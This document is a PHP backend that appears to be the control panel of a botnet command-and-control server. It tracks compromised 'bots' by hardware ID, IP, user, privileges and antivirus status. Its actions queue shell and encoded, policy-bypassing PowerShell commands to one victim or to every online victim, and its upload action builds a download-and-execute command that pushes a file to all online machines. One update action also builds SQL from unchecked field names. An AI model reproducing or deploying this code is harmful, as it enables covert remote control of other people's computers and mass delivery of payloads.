<?php
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    echo json_encode(['success' => false, 'message' => 'Unauthorized access.']);
    exit;
}

require 'db_config.php';

$action = $_REQUEST['action'] ?? '';

function prepareCommand($rawCommand, $commandType) {
    $finalCommand = "";
    $commandType = strtolower($commandType);

    if ($commandType === "cmd") {
        $finalCommand = "cmd.exe /c \"" . escapeshellarg($rawCommand) . "\"";
    } elseif ($commandType === "powershell") {
        $utf16leCommand = mb_convert_encoding($rawCommand, 'UTF-16LE', 'UTF-8');
        $encodedCommand = base64_encode($utf16leCommand);
        
        $finalCommand = "powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand " . escapeshellarg($encodedCommand);
    } else {
        error_log("Unknown command type: " . $commandType);
        return false;
    }
    return $finalCommand;
}

switch ($action) {
    case 'getData':
        try {
            $bots_query = $pdo->query("SELECT hwid, ip, country, user, privileges, os, uptime, status, client_version, tag, hostname, integrity FROM bots ORDER BY status DESC, last_seen DESC");
            $bots = $bots_query->fetchAll();

            // Updated query to join with 'bots' table for username and fetch 'raw_cmd'
            $pending_tasks_query = $pdo->query("
                SELECT 
                    q.id, 
                    q.hwid, 
                    q.cmd, 
                    q.raw_cmd, 
                    q.sent, 
                    q.created_at, 
                    q.status_message, 
                    b.user AS username 
                FROM 
                    queue q 
                LEFT JOIN 
                    bots b ON q.hwid = b.hwid 
                WHERE 
                    q.sent = 0 
                ORDER BY 
                    q.created_at DESC
            ");
            $pending_tasks = $pending_tasks_query->fetchAll();

            $unapproved_count = $pdo->query("SELECT COUNT(*) FROM rejected_packets")->fetchColumn();

            $online_count = $pdo->query("SELECT COUNT(*) FROM bots WHERE status = 'Online'")->fetchColumn();
            $offline_count = $pdo->query("SELECT COUNT(*) FROM bots WHERE status = 'Offline'")->fetchColumn();
            $pending_count = count($pending_tasks);

            echo json_encode([
                'success' => true,
                'bots' => $bots,
                'pending_tasks' => $pending_tasks,
                'online_count' => $online_count,
                'offline_count' => $offline_count,
                'pending_count' => $pending_count,
                'unapproved_count' => $unapproved_count
            ]);
        } catch (PDOException $e) {
            echo json_encode(['success' => false, 'message' => 'Error fetching data: ' . $e->getMessage()]);
        }
        break;

    case 'sendCommand':
        $command = $_POST['command'] ?? ''; // This is the raw command input from frontend
        $hwid = $_POST['hwid'] ?? '';
        $commandType = $_POST['command_type'] ?? '';

        if (!empty($command) && !empty($hwid) && !empty($commandType)) {
            $finalCommand = prepareCommand($command, $commandType);
            if ($finalCommand === false) {
                echo json_encode(['success' => false, 'message' => 'Invalid command type specified.']);
                break;
            }

            // Store the raw command for display in the frontend
            $rawCommandForDB = ($commandType === 'powershell') ? $command : $finalCommand; // If CMD, raw_cmd is the same as final, if PowerShell, store original

            try {
                // Updated SQL to include raw_cmd and initial status_message
                $stmt = $pdo->prepare("INSERT INTO queue (hwid, cmd, raw_cmd, sent, status_message) VALUES (?, ?, ?, 0, 'pending')");
                $stmt->execute([$hwid, $finalCommand, $rawCommandForDB]);
                echo json_encode(['success' => true, 'message' => 'Command queued successfully.']);
            } catch (PDOException $e) {
                echo json_encode(['success' => false, 'message' => 'Failed to queue command: ' . $e->getMessage()]);
            }
        } else {
            echo json_encode(['success' => false, 'message' => 'Invalid command, HWID, or command type.']);
        }
        break;

    case 'deleteBot':
        $hwid = $_POST['hwid'] ?? '';

        if (!empty($hwid)) {
            try {
                $stmt = $pdo->prepare("DELETE FROM bots WHERE hwid = ?");
                $stmt->execute([$hwid]);
                echo json_encode(['success' => true, 'message' => 'Bot deleted successfully.']);
            } catch (PDOException $e) {
                echo json_encode(['success' => false, 'message' => 'Failed to delete bot.']);
            }
        } else {
            echo json_encode(['success' => false, 'message' => 'Invalid HWID.']);
        }
        break;

    case 'sendCommandToAll':
        $command = $_POST['command'] ?? ''; // This is the raw command input from frontend
        $tag = $_POST['tag'] ?? 'N/A';
        $commandType = $_POST['command_type'] ?? '';

        if (!empty($command)) {
            $finalCommand = prepareCommand($command, $commandType);
            if ($finalCommand === false) {
                echo json_encode(['success' => false, 'message' => 'Invalid command type specified.']);
                break;
            }

            // Store the raw command for display in the frontend
            $rawCommandForDB = ($commandType === 'powershell') ? $command : $finalCommand; // If CMD, raw_cmd is the same as final, if PowerShell, store original

            try {
                $stmt_online_bots = $pdo->query("SELECT hwid FROM bots WHERE status = 'Online'");
                $online_bots = $stmt_online_bots->fetchAll(PDO::FETCH_COLUMN);

                if (count($online_bots) > 0) {
                    // Updated placeholders and SQL to include raw_cmd and initial status_message
                    $placeholders = implode(',', array_fill(0, count($online_bots), '(?, ?, ?, ?, 0, \'pending\')'));
                    $sql = "INSERT INTO queue (hwid, cmd, raw_cmd, tag, sent, status_message) VALUES $placeholders";
                    $stmt = $pdo->prepare($sql);
                    
                    $values = [];
                    foreach ($online_bots as $hwid) {
                        $values[] = $hwid;
                        $values[] = $finalCommand;
                        $values[] = $rawCommandForDB;
                        $values[] = $tag;
                    }
                    $stmt->execute($values);
                    echo json_encode(['success' => true, 'message' => "Command sent to " . count($online_bots) . " clients."]);
                } else {
                    echo json_encode(['success' => true, 'message' => 'No online clients to send command to.']);
                }

            } catch (PDOException $e) {
                echo json_encode(['success' => false, 'message' => 'Failed to queue commands for all clients: ' . $e->getMessage()]);
            }
        } else {
            echo json_encode(['success' => false, 'message' => 'Command cannot be empty.']);
        }
        break;

    case 'deleteQueueItem':
        $id = $_POST['id'] ?? '';
        if (!empty($id)) {
            try {
                $stmt = $pdo->prepare("DELETE FROM queue WHERE id = ?");
                $stmt->execute([$id]);
                echo json_encode(['success' => true, 'message' => 'Task deleted.']);
            } catch (PDOException $e) {
                error_log("Failed to delete task: " . $e->getMessage());
                echo json_encode(['success' => false, 'message' => 'Failed to delete task: ' . $e->getMessage()]);
            }
        } else {
            echo json_encode(['success' => false, 'message' => 'Invalid task ID.']);
        }
        break;

    case 'clearQueue':
        try {
            $pdo->query("DELETE FROM queue WHERE sent = 0");
            echo json_encode(['success' => true, 'message' => 'All pending tasks cleared.']);
        } catch (PDOException $e) {
            error_log("Failed to clear tasks: " . $e->getMessage());
            echo json_encode(['success' => false, 'message' => 'Failed to clear tasks: ' . $e->getMessage()]);
        }
        break;

    case 'uploadAndUpdate':
        if (!isset($_FILES['updateFile']) || $_FILES['updateFile']['error'] !== UPLOAD_ERR_OK) {
            echo json_encode(['success' => false, 'message' => 'No file uploaded or an upload error occurred.']);
            exit;
        }

        $tag = $_POST['tag'] ?? 'N/A';
        $file = $_FILES['updateFile'];
        $uploadDir = 'uploads/';
        $uploadFile = $uploadDir . basename($file['name']);

        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0777, true);
        }

        if (move_uploaded_file($file['tmp_name'], $uploadFile)) {
            try {
                $download_url = 'https://your-domain.com/' . $uploadFile;
                $destination_path = 'C:\\Temp\\' . basename($file['name']);
                // This command is already hardcoded as a PowerShell command via cmd.exe
                $command = "cmd /c \"powershell -c (New-Object System.Net.WebClient).DownloadFile('" . $download_url . "', '" . $destination_path . "'); Start-Process '" . $destination_path . "'\"";
                
                // For 'uploadAndUpdate', the raw_cmd can be set to the same as cmd, or a simpler description
                $rawCommandForDB = "Download & Execute: " . basename($file['name']);

                $stmt_online_bots = $pdo->query("SELECT hwid FROM bots WHERE status = 'Online'");
                $online_bots = $stmt_online_bots->fetchAll(PDO::FETCH_COLUMN);

                if (count($online_bots) > 0) {
                    // Updated placeholders and SQL to include raw_cmd and initial status_message
                    $placeholders = implode(',', array_fill(0, count($online_bots), '(?, ?, ?, ?, 0, \'pending\')'));
                    $sql = "INSERT INTO queue (hwid, cmd, raw_cmd, tag, sent, status_message) VALUES $placeholders";
                    $stmt = $pdo->prepare($sql);

                    $values = [];
                    foreach ($online_bots as $hwid) {
                        $values[] = $hwid;
                        $values[] = $command;
                        $values[] = $rawCommandForDB; // Use the descriptive raw command
                        $values[] = $tag;
                    }
                    $stmt->execute($values);
                }

                echo json_encode(['success' => true, 'message' => 'File uploaded and command queued for all online clients.']);
            } catch (PDOException $e) {
                echo json_encode(['success' => false, 'message' => 'Database error: ' . $e->getMessage()]);
            }
        } else {
            echo json_encode(['success' => false, 'message' => 'Failed to move uploaded file.']);
        }
        break;

    case 'getBotInfo':
        $hwid = $_GET['hwid'] ?? '';
        if (!empty($hwid)) {
            try {
                $stmt_info = $pdo->prepare("SELECT * FROM bots WHERE hwid = ?");
                $stmt_info->execute([$hwid]);
                $bot_info = $stmt_info->fetch();

                $stmt_output = $pdo->prepare("SELECT output FROM output WHERE hwid = ? ORDER BY timestamp DESC LIMIT 1");
                $stmt_output->execute([$hwid]);
                $bot_output = $stmt_output->fetchColumn() ?: 'No output available.';

                if ($bot_info) {
                    echo json_encode(['success' => true, 'info' => $bot_info, 'output' => $bot_output]);
                } else {
                    echo json_encode(['success' => false, 'message' => 'Bot not found.']);
                }
            } catch (PDOException $e) {
                echo json_encode(['success' => false, 'message' => 'Database error: ' . $e->getMessage()]);
            }
        } else {
            echo json_encode(['success' => false, 'message' => 'Invalid HWID.']);
        }
        break;

    case 'updateBotInfo':
        $hwid = $_POST['hwid'] ?? '';
        $info_data = json_decode($_POST['data'] ?? '{}', true);

        if (!empty($hwid)) {
            try {
                $sql = "UPDATE bots SET ";
                $params = [];
                $updates = [];

                foreach ($info_data as $key => $value) {
                    $updates[] = "$key = ?";
                    $params[] = $value;
                }
                $params[] = $hwid;

                if (!empty($updates)) {
                    $sql .= implode(', ', $updates) . " WHERE hwid = ?";
                    $stmt = $pdo->prepare($sql);
                    $stmt->execute($params);
                }

                echo json_encode(['success' => true, 'message' => 'Bot info updated.']);

            } catch (PDOException $e) {
                echo json_encode(['success' => false, 'message' => 'Failed to update bot info: ' . $e->getMessage()]);
            }
        } else {
            echo json_encode(['success' => false, 'message' => 'Invalid HWID.']);
        }
        break;

    // NEW: Action to update a task's status (for bots to report back)
    case 'updateTaskStatus':
        $id = $_POST['id'] ?? ''; // Task ID from the queue table
        $statusMessage = $_POST['status_message'] ?? ''; // e.g., 'completed', 'failed: Access Denied'

        if (!empty($id) && !empty($statusMessage)) {
            try {
                // Update the status_message for the specific task
                $stmt = $pdo->prepare("UPDATE queue SET status_message = ? WHERE id = ?");
                $stmt->execute([$statusMessage, $id]);
                echo json_encode(['success' => true, 'message' => 'Task status updated.']);
            } catch (PDOException $e) {
                error_log("Failed to update task status: " . $e->getMessage());
                echo json_encode(['success' => false, 'message' => 'Failed to update task status: ' . $e->getMessage()]);
            }
        } else {
            echo json_encode(['success' => false, 'message' => 'Invalid task ID or status message.']);
        }
        break;

    case 'getUnapprovedClients':
        try {
            $stmt = $pdo->query("SELECT id, hwid, ip, raw_content, reason, timestamp FROM rejected_packets ORDER BY timestamp DESC");
            $clients = $stmt->fetchAll(PDO::FETCH_ASSOC);
            echo json_encode(['success' => true, 'clients' => $clients]);
        } catch (PDOException $e) {
            echo json_encode(['success' => false, 'message' => 'Error fetching unapproved clients: ' . $e->getMessage()]);
        }
        break;

    case 'approveClient':
        $id = $_POST['id'] ?? '';
        $hwid = $_POST['hwid'] ?? '';
        $ip = $_POST['ip'] ?? '';
        $raw_content = $_POST['raw_content'] ?? '';
        $reason = $_POST['reason'] ?? '';
        $timestamp = $_POST['timestamp'] ?? '';

        if (!empty($id) && !empty($hwid) && !empty($ip)) {
            try {
                $pdo->beginTransaction();

                $bot_data = json_decode(urldecode($raw_content), true);

                $user = $bot_data['user'] ?? 'N/A';
                $privileges = $bot_data['privileges'] ?? 'N/A';
                $os = $bot_data['os'] ?? 'N/A';
                $uptime = $bot_data['uptime'] ?? 'N/A';
                $client_version = $bot_data['client_version'] ?? 'v1.0';
                $tag = $bot_data['tag'] ?? 'N/A';
                $hostname = $bot_data['hostname'] ?? 'N/A';
                $integrity = $bot_data['integrity'] ?? 'N/A';
                $sleep_interval = $bot_data['sleep_interval'] ?? 'N/A';
                $antivirus_status = $bot_data['antivirus_status'] ?? 'N/A';
                $country = $bot_data['country'] ?? 'N/A';

                $stmt_insert_bot = $pdo->prepare("INSERT INTO bots (hwid, ip, user, privileges, os, uptime, status, client_version, tag, hostname, integrity, sleep_interval, antivirus_status, country, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())");
                $stmt_insert_bot->execute([
                    $hwid, $ip, $user, $privileges, $os, $uptime, 'Offline',
                    $client_version, $tag, $hostname, $integrity, $sleep_interval, $antivirus_status, $country
                ]);

                $stmt_insert_whitelist = $pdo->prepare("INSERT INTO ip_whitelist (ip_address, description) VALUES (?, ?)");
                $stmt_insert_whitelist->execute([$ip, 'Jin Tactics static for all approve']);

                $stmt_delete_rejected = $pdo->prepare("DELETE FROM rejected_packets WHERE id = ?");
                $stmt_delete_rejected->execute([$id]);

                $pdo->commit();
                echo json_encode(['success' => true, 'message' => 'Client approved and moved to active bots.']);
            } catch (PDOException $e) {
                $pdo->rollBack();
                error_log("Failed to approve client: " . $e->getMessage());
                echo json_encode(['success' => false, 'message' => 'Failed to approve client: ' . $e->getMessage()]);
            }
        } else {
            echo json_encode(['success' => false, 'message' => 'Invalid data for client approval.']);
        }
        break;

    case 'denyClient':
        $id = $_POST['id'] ?? '';
        if (!empty($id)) {
            try {
                $stmt = $pdo->prepare("DELETE FROM rejected_packets WHERE id = ?");
                $stmt->execute([$id]);
                echo json_encode(['success' => true, 'message' => 'Client denied and entry removed.']);
            } catch (PDOException $e) {
                error_log("Failed to deny client: " . $e->getMessage());
                echo json_encode(['success' => false, 'message' => 'Failed to deny client: ' . $e->getMessage()]);
            }
        } else {
            echo json_encode(['success' => false, 'message' => 'Invalid client ID for denial.']);
        }
        break;

    case 'changePassword':
        $currentPassword = $_POST['current_password'] ?? '';
        $newPassword = $_POST['new_password'] ?? '';

        if (empty($currentPassword) || empty($newPassword)) {
            echo json_encode(['success' => false, 'message' => 'Current and new password cannot be empty.']);
            break;
        }

        try {
            $stmt = $pdo->prepare("SELECT password FROM users WHERE username = 'admin'");
            $stmt->execute();
            $user = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($user && password_verify($currentPassword, $user['password'])) {
                $hashedNewPassword = password_hash($newPassword, PASSWORD_DEFAULT);
                $stmt_update = $pdo->prepare("UPDATE users SET password = ? WHERE username = 'admin'");
                $stmt_update->execute([$hashedNewPassword]);
                echo json_encode(['success' => true, 'message' => 'Password changed successfully.']);
            } else {
                echo json_encode(['success' => false, 'message' => 'Invalid current password.']);
            }
        } catch (PDOException $e) {
            error_log("Failed to change password: " . $e->getMessage());
            echo json_encode(['success' => false, 'message' => 'Failed to change password: ' . $e->getMessage()]);
        }
        break;

    default:
        echo json_encode(['success' => false, 'message' => 'Unknown action.']);
        break;
}
?>
